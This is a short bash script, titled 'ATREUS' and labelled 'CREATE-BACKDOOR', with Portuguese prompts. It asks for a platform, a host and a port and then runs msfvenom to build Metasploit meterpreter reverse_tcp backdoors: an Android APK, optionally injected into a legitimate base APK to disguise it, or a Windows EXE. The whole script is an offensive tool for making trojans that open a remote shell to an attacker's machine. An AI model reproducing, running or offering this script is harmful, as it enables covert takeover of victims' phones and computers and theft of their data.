#!/bin/bash 

clear;

echo -e " \033[1;31m 
 █████╗ ████████╗██████╗ ███████╗██╗   ██╗███████╗
██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║   ██║██╔════╝
███████║   ██║   ██████╔╝█████╗  ██║   ██║███████╗
██╔══██║   ██║   ██╔══██╗██╔══╝  ██║   ██║╚════██║
██║  ██║   ██║   ██║  ██║███████╗╚██████╔╝███████║
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝ \033[0m    "
echo -e " \033[0;32m CREATE-BACKDOOR BY:ZERO [ATREUS]  \033[0m  "

echo '[1] Android'
echo '[2] Windows'
echo '[3] Exit'

read -p "Qual plataforma você deseja usar?" resposta

 if [ $resposta = "1" ];
    then
       read -p "Deseja usar um APK de base? [S/N] PS: RECOMENDO USAR SOMENTE EM PC" sn
       if [ $sn = "S" ]
          then 
             read -p "Digite o caminho do APK:" apk 
             read -p "Digite o nome do Payload:" payload 
             read -p "Digite o HOST:" host 
             read -p "Digite a PORTA:" porta 
             msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > $payload.apk
          else 
             read -p "Digite o nome do Payload:" payload 
             read -p "Digite o HOST:" host 
             read -p "Digite a PORTA:" porta 
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$porta R > $payload.apk 
        fi                     
elif [ $resposta = "2" ] 
   then 
       read -p "Digite o nome do seu Payload" payload
       read -p "Digite o HOST:" host
       read -p "Digite a PORTA" porta
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$porta -f exe > $payload.exe
else
   exit 
fi 
